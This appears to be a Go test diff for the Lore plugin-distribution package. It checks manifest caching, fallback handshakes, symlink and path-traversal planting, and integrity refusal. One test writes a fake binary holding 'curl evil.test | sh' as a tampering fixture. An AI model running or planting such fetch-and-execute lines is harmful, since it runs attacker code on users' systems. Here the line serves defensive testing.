@@ -1,14 +1,17 @@
 package plugindist
 
 import (
+	"context"
 	"os"
 	"path/filepath"
+	"reflect"
 	"strings"
 	"testing"
 
 	"github.com/setthasit/Lore/internal/config"
 	"github.com/setthasit/Lore/internal/errors/internalerror"
 	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
+	"github.com/setthasit/Lore/sdk"
 )
 
 func TestPluginBinaryRefusesARewrittenCachedBinary(t *testing.T) {
@@ -464,5 +467,163 @@ func TestStoreRefusesANameThatIsNotOneDirectoryName(t *testing.T) {
 	}
 	if len(entries) != 0 {
 		t.Fatalf("a refused name created %d entries around the cache root, want none", len(entries))
+	}
+}
+
+var liveManifest = lore.Manifest{
+	Name: "linear", Kind: lore.KindProvider, APIVersion: lore.APIVersion, Summary: "answered by the binary",
+}
+
+func installedWorkspace(t *testing.T) (*Workspace, *countingHandshake, Result) {
+	t.Helper()
+
+	path := scratchWorkspace(t, "workspace: myproject\n\nplugins:\n"+
+		"  - name: linear\n    from: github.com/jdoe/lore-linear@v0.3.1\n")
+	handshake := &countingHandshake{manifest: liveManifest}
+	workspace, err := Open(path, WithHandshake(handshake.answer))
+	if err != nil {
+		t.Fatalf("open the workspace: %v", err)
+	}
+
+	coord, err := Resolve(workspace.dir, workspace.Plugins()[0])
+	if err != nil {
+		t.Fatalf("resolve the declaration: %v", err)
+	}
+	publishRelease(t, workspace, coord)
+
+	results, err := workspace.Install(context.Background(), nil, func() {})
+	if err != nil {
+		t.Fatalf("install the declared plugin: %v", err)
+	}
+	if len(results) != 1 {
+		t.Fatalf("results = %+v, want the one declared install", results)
+	}
+	return workspace, handshake, results[0]
+}
+
+func plantCaptureAboveTheVersion(t *testing.T, dir string) string {
+	t.Helper()
+
+	path := filepath.Join(dir, "..", "planted.json")
+	planted := lore.Manifest{Name: "linear", Kind: lore.KindSource, APIVersion: lore.APIVersion,
+		Summary: "planted beside the version"}
+	if err := writeJSON(path, planted); err != nil {
+		t.Fatalf("plant a capture outside the version: %v", err)
+	}
+	return path
+}
+
+func TestPluginManifestServesTheStoredCaptureWithoutAHandshake(t *testing.T) {
+	workspace, handshake, installed := installedWorkspace(t)
+
+	manifest, err := workspace.Manifest(workspace.Plugins()[0])
+	if err != nil {
+		t.Fatalf("serve the stored manifest: %v", err)
+	}
+	if handshake.calls != 0 {
+		t.Errorf("serving a stored capture ran the binary %d times, want none", handshake.calls)
+	}
+
+	captured, _ := stubHandshake(installed.Binary)
+	if !reflect.DeepEqual(manifest, captured) {
+		t.Fatalf("manifest = %+v, want the capture the install stored %+v", manifest, captured)
+	}
+}
+
+func TestPluginManifestReHandshakesOnceForAnUnusableCapture(t *testing.T) {
+	cases := []struct {
+		name   string
+		damage func(t *testing.T, dir string)
+	}{
+		{
+			name: "the capture is deleted",
+			damage: func(t *testing.T, dir string) {
+				if err := os.Remove(filepath.Join(dir, manifestFileName)); err != nil {
+					t.Fatalf("delete the capture: %v", err)
+				}
+			},
+		},
+		{
+			name: "the capture does not decode",
+			damage: func(t *testing.T, dir string) {
+				garbled := []byte(`{"name":"linear","kind":"source","api_version":1,"summary":123}`)
+				if err := os.WriteFile(filepath.Join(dir, manifestFileName), garbled, 0o600); err != nil {
+					t.Fatalf("garble the capture: %v", err)
+				}
+			},
+		},
+		{
+			name: "the capture answers another protocol",
+			damage: func(t *testing.T, dir string) {
+				stale := lore.Manifest{Name: "linear", Kind: lore.KindSource, APIVersion: lore.APIVersion + 1}
+				if err := writeJSON(filepath.Join(dir, manifestFileName), stale); err != nil {
+					t.Fatalf("write a stale capture: %v", err)
+				}
+			},
+		},
+		{
+			name: "the capture is a link out of the version directory",
+			damage: func(t *testing.T, dir string) {
+				planted := plantCaptureAboveTheVersion(t, dir)
+				path := filepath.Join(dir, manifestFileName)
+				if err := os.Remove(path); err != nil {
+					t.Fatalf("delete the capture: %v", err)
+				}
+				if err := os.Symlink(planted, path); err != nil {
+					t.Fatalf("link the capture to %s: %v", planted, err)
+				}
+			},
+		},
+		{
+			name: "the record names a capture outside the version directory",
+			damage: func(t *testing.T, dir string) {
+				planted := plantCaptureAboveTheVersion(t, dir)
+				record, err := readInstallRecord(dir)
+				if err != nil {
+					t.Fatalf("read the install record: %v", err)
+				}
+				record.Manifest = filepath.Join("..", filepath.Base(planted))
+				if err := writeInstallRecord(dir, record); err != nil {
+					t.Fatalf("rewrite the install record: %v", err)
+				}
+			},
+		},
+	}
+
+	for _, test := range cases {
+		t.Run(test.name, func(t *testing.T) {
+			workspace, handshake, installed := installedWorkspace(t)
+			test.damage(t, filepath.Dir(installed.Binary))
+
+			manifest, err := workspace.Manifest(workspace.Plugins()[0])
+			if err != nil {
+				t.Fatalf("serve a manifest around an unusable capture: %v", err)
+			}
+			if handshake.calls != 1 {
+				t.Errorf("the fallback ran the binary %d times, want exactly one", handshake.calls)
+			}
+			if !reflect.DeepEqual(manifest, liveManifest) {
+				t.Errorf("manifest = %+v, want the one the binary answered %+v", manifest, liveManifest)
+			}
+		})
+	}
+}
+
+func TestPluginManifestRefusesARewrittenBinaryWithoutAHandshake(t *testing.T) {
+	workspace, handshake, installed := installedWorkspace(t)
+
+	if err := os.Remove(filepath.Join(filepath.Dir(installed.Binary), manifestFileName)); err != nil {
+		t.Fatalf("delete the capture: %v", err)
+	}
+	if err := os.WriteFile(installed.Binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
+		t.Fatalf("rewrite the cached binary: %v", err)
+	}
+
+	manifest, err := workspace.Manifest(workspace.Plugins()[0])
+	if err == nil {
+		t.Fatalf("a rewritten binary answered with %+v, want a refusal", manifest)
+	}
+	if handshake.calls != 0 {
+		t.Errorf("a failed integrity check ran the binary %d times, want none", handshake.calls)
 	}
 }
